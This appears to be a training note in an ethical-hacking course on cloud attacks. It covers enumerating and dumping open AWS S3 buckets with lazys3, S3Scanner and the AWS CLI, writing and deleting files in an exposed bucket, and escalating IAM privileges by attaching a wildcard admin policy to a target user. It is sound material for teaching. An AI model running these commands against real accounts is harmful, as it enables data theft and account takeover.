# Cloud Computing
> Cloud computing delivers various types of services and applications over the Internet. These services enable users to use software and hardware managed by third parties at remote locations. Some well-known cloud service providers are Google, Amazon, and Microsoft.


verview of Cloud Computing
- Cloud computing refers to on-demand delivery of IT capabilities, in which IT infrastructure and applications are provided to subscribers as metered services over a network. Cloud services are classified into three categories, namely infrastructure-as-a-service (IaaS), platform-as-a-service (PaaS), and software-as-a-service (SaaS), which offer different techniques for developing cloud.

Enumerate S3 Buckets using lazys3
- lazys3 is a Ruby script tool that is used to brute-force AWS S3 buckets using different permutations. This tool obtains the publicly accessible S3 buckets and also allows you to search the S3 buckets of a specific company by entering the company name.
- ` ruby lazys3.rb [Company] `

Enumerate S3 Buckets using S3Scanner
- S3Scanner is a tool that finds the open S3 buckets and dumps their contents. It takes a list of bucket names to check as its input. The S3 buckets that are found are output to a file. The tool also dumps or lists the contents of “open” buckets locally.
- ` python3 ./s3scanner.py sites.txt `
- Dump all open buckets and log both open and closed buckets in found.txt:
  - ` python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt `
- Just log open buckets in the default output file (buckets.txt):
  - ` python3 ./s3scanner.py names.txt `
- Save the file listings of all open buckets to a file:
  - ` python ./s3scanner.py --list names.txt `


S3 buckets are used by customers and end users to store text documents, PDFs, videos, images, etc. To store all these data, the user needs to create a bucket with a unique name.

Listed below are several techniques that can be adopted to identify AWS S3 Buckets:

- Inspecting HTML: Analyze the source code of HTML web pages in the background to find URLs to the target S3 buckets
- Brute-Forcing URL: Use Burp Suite to perform a brute-force attack on the target bucket’s URL to identify its correct URL
- Finding subdomains: Use tools such as Findsubdomains and Robtex to identify subdomains related to the target bucket
- Reverse IP Search: Use search engines such as Bing to perform reverse IP search to identify the domains of the target S3 buckets
- Advanced Google hacking: Use advanced Google search operators such as “inurl” to search for URLs related to the target S3 buckets


Exploit Open S3 Buckets using AWS CLI
- The AWS command line interface (CLI) is a unified tool for managing AWS services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.
- ` aws configure `
  - It will ask for the following details:
    - AWS Access Key ID
    - AWS Secret Access Key
    - Default region name
    - Default output format
- `aws s3 ls s3://[Bucket Name]`
- ` aws s3 mv Hack.txt s3://certifiedhacker1 `
- `  aws s3 rm s3://certifiedhacker1/Hack.txt  `


Overview of Privilege Escalation

- Privileges are security roles assigned to users for using specific programs, features, OSes, functions, files, code, etc. to limit access depending on the type of user. Privilege escalation is required when you want to access system resources that you are not authorized to access. It takes place in two forms: vertical and horizontal.
- Horizontal Privilege Escalation: An unauthorized user tries to access the resources, functions, and other privileges of an authorized user who has similar access permissions
- Vertical Privilege Escalation: An unauthorized user tries to access the resources and functions of a user with higher privileges such as application or site administrators


Escalate IAM User Privileges by Exploiting Misconfigured User Policy
- A policy is an entity that, when attached to an identity or resource, defines its permissions. You can use the AWS Management Console, AWS CLI, or AWS API to create customer-managed policies in IAM. Customer-managed policies are standalone policies that you administer in your AWS account. You can then attach the policies to the identities (users, groups, and roles) in your AWS account. If the user policies are not configured properly, they can be exploited by attackers to gain full administrator access to the target user’s AWS account.

` aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json `
- user-policy.json
```json
{

"Version":"2012-10-17",

"Statement": [
{

    "Effect":"Allow",

    "Action":"*",

    "Resource":"*"

}
]
}
```

- ` aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy `
-  ` aws iam list-attached-user-policies --user-name [Target Username] `
-  `  aws iam list-users `
-  List of S3 buckets: ` aws s3api list-buckets --query "Buckets[].Name" `
-  User Policies: ` aws iam list-user-policies `
-  Role Policies: `aws iam list-role-policies`
-  Group policies: `aws iam list-group-policies`
-  Create user: ` aws iam create-user `



